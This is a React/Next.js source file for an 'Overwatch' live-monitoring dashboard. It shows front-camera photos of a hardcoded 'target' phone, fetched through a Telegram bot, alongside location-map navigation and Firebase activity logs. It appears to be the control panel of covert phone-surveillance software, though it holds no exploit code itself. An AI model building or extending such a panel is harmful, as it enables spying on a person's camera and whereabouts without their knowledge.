/**
 * Overwatch v1.0 - Flying Bird Dashboard
 * Real-time Monitoring System
 * Camera: Telegram Bot | Logs: Firebase
 */

'use client';

import React, { useEffect, useState } from 'react';
import { motion } from 'framer-motion';
import { Camera, MapPin, Activity, Trash2 } from 'lucide-react';
import { useRouter } from 'next/navigation';
import { useSystemLogs, useActiveDevices, useDeviceLocations } from '@/hooks/useFirebase';
import { formatTimeAgo } from '@/lib/utils';

export default function DashboardPage() {
  const router = useRouter();
  const { devices } = useActiveDevices();
  const { logs } = useSystemLogs(50);
  const [selectedTarget] = useState('SM-G998B');
  const [cameraImage, setCameraImage] = useState<string | null>(null);
  const [cameraLoading, setCameraLoading] = useState(true);

  // Fetch camera image dari Telegram bot
  useEffect(() => {
    const fetchTelegramImage = async () => {
      try {
        setCameraLoading(true);
        const response = await fetch(`/api/telegram/latest-photo?deviceId=${selectedTarget}`);
        const data = await response.json();
        
        if (data.imageUrl) {
          setCameraImage(data.imageUrl);
        }
        setCameraLoading(false);
      } catch (error) {
        console.error('Failed to fetch camera image:', error);
        setCameraLoading(false);
      }
    };

    fetchTelegramImage();
  }, [selectedTarget]);

  const handleCameraClick = () => {
    router.push('/dashboard/map');
  };

  return (
    <motion.div
      className="space-y-6"
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
    >
      {/* Header: Live Monitoring */}
      <div className="border-b-2 border-emerald-500/40 pb-4">
        <h1 className="text-xl font-bold text-emerald-400 font-mono tracking-wider">
          ▶ [ LIVE MONITORING ]
        </h1>
        <p className="text-xs text-emerald-500/60 mt-1 font-mono">
          Target: {selectedTarget} | Devices: {devices.length} | Last Update: {new Date().toLocaleTimeString()}
        </p>
      </div>

      {/* Main Content: Camera Feed (Clickable to Maps) + Activity Logs */}
      <div className="grid grid-cols-12 gap-4">
        {/* Camera Feed - Left (7 cols) - Clickable to Maps */}
        <motion.div
          onClick={handleCameraClick}
          className="col-span-7 border-2 border-emerald-500/40 bg-emerald-500/5 rounded overflow-hidden hover:border-emerald-400/80 hover:shadow-lg hover:shadow-emerald-500/30 transition-all cursor-pointer group"
          whileHover={{ scale: 1.01 }}
        >
          <div className="px-4 py-3 border-b border-emerald-500/30 flex items-center gap-2">
            <Camera size={16} className="text-emerald-400 group-hover:animate-pulse" />
            <h2 className="text-sm font-bold text-emerald-300 font-mono uppercase">
              [ FRONT CAM ] ← Click untuk Maps
            </h2>
          </div>

          {/* Camera Stream */}
          <div className="bg-black aspect-video flex items-center justify-center relative overflow-hidden">
            {cameraLoading ? (
              <div className="absolute inset-0 bg-gradient-to-r from-emerald-500/10 to-transparent animate-pulse flex items-center justify-center">
                <div className="text-center">
                  <p className="text-xs text-emerald-500/60 font-mono animate-pulse">
                    ◆ LOADING CAMERA FEED...
                  </p>
                </div>
              </div>
            ) : cameraImage ? (
              <img
                src={cameraImage}
                alt="Camera Feed"
                className="w-full h-full object-cover"
              />
            ) : (
              <div className="flex flex-col items-center justify-center w-full h-full bg-gradient-to-b from-emerald-900/20 to-black">
                <Camera size={48} className="text-emerald-500/40 mb-2" />
                <p className="text-xs text-emerald-500/50 font-mono">[TELEGRAM BOT STREAM]</p>
              </div>
            )}
          </div>

          <div className="px-4 py-2 bg-emerald-500/5 border-t border-emerald-500/30 text-xs text-emerald-500/60 font-mono">
            Source: Telegram Bot | Resolution: Auto | Status: {cameraLoading ? 'Loading...' : 'Ready'}
          </div>
        </motion.div>

        {/* Activity Logs - Right (5 cols) */}
        <div className="col-span-5 border-2 border-emerald-500/40 bg-emerald-500/5 rounded overflow-hidden hover:border-emerald-400/60 transition-all flex flex-col">
          <div className="px-4 py-3 border-b border-emerald-500/30 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <Activity size={16} className="text-emerald-400" />
              <h2 className="text-sm font-bold text-emerald-300 font-mono uppercase">
                [ LOGS ]
              </h2>
            </div>
            <button className="text-xs px-2 py-1 border border-red-500/30 text-red-400/70 hover:border-red-400 hover:text-red-400 rounded transition-all flex items-center gap-1 font-mono">
              <Trash2 size={12} />
              Clear
            </button>
          </div>

          {/* Log Viewer */}
          <div className="bg-black flex-1 overflow-y-auto p-4 font-mono text-xs">
            {logs.length === 0 ? (
              <p className="text-emerald-500/40">$ No activity logs available</p>
            ) : (
              <div className="space-y-1">
                {logs.map((log) => (
                  <div
                    key={log.id}
                    className="flex gap-2 hover:bg-emerald-500/10 px-2 py-1 rounded transition-all text-emerald-400/70"
                  >
                    <span className="text-emerald-500/60 flex-shrink-0">
                      [{formatTimeAgo(log.timestamp)}]
                    </span>
                    <span className="text-emerald-500/80">›</span>
                    {log.deviceId && (
                      <span className="text-emerald-600 flex-shrink-0">
                        {log.deviceId}
                      </span>
                    )}
                    <span className="flex-1 truncate">{log.message}</span>
                  </div>
                ))}
              </div>
            )}
          </div>

          <div className="px-4 py-2 bg-emerald-500/5 border-t border-emerald-500/30 text-xs text-emerald-500/60 font-mono flex justify-between">
            <span>Events: {logs.length}</span>
            <span>Firebase: ●</span>
          </div>
        </div>
      </div>
    </motion.div>
  );
}
